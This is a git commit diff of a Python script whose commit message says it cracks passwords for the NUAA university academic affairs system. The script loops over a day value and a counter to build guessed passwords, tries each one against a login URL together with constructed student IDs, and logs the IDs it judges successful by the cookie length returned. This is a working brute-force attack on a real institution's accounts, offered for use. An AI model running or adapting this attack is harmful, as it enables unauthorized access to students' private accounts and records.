ef88c1b4e870e04bb7fcb3c735af8e08b61a2ed1
BenBoErBa-ZhangShiBo <610079410@qq.com>
2018-01-26 14:06:07 +0800

    破解NUAA教务处密码

--- 爬虫/passworld_up1.py
+++ 爬虫/passworld_up1.py
@@ -9,21 +9,17 @@ class JiaoWuChu:
 
     def id(self,x):
         x=str(x)
-        nuaaid='0316'+x+'00'
-        self.nuaaid='031620316'
+        nuaaid='0316'+x
+
 
     def psd(self,day,n):
         day=str(day)
         n=str(n)
         str1=str(day+n).zfill(6)
-        passwd='St'+str1
-        #print(passwd)
-        self.passwd='St132615'
-        print(self.passwd)
+        self.passwd='St'+str1
 
     def get(self):
-        Cookie_len=len(requests.get(self.url+self.nuaaid+ '&pwd=' + self.passwd,timeout=12).headers['Set-Cookie'])
-        print(Cookie_len)
+        Cookie_len=len(requests.get(self.url+self.nuaaid+ '&pwd=' + self.passwd,timeout=30).headers['Set-Cookie'])
         if Cookie_len==331:
             f = open('D:\\2.txt', 'a')
             f.write(self.nuaaid)
@@ -34,11 +30,12 @@ class JiaoWuChu:
 
 if __name__ == '__main__':
     jiaowuchu=JiaoWuChu()
-    print('输入班级和初始学号，例如：201')
+    print('输入班级和初始学号，例如：20101')
     idx=int(input())
     jiaowuchu.id(idx)
-    if
     for day in range(1,32):
         for n in range(0,9999):
             jiaowuchu.psd(day,n)
             yesno=jiaowuchu.get()
+            if yesno=='ok':
+                exit()
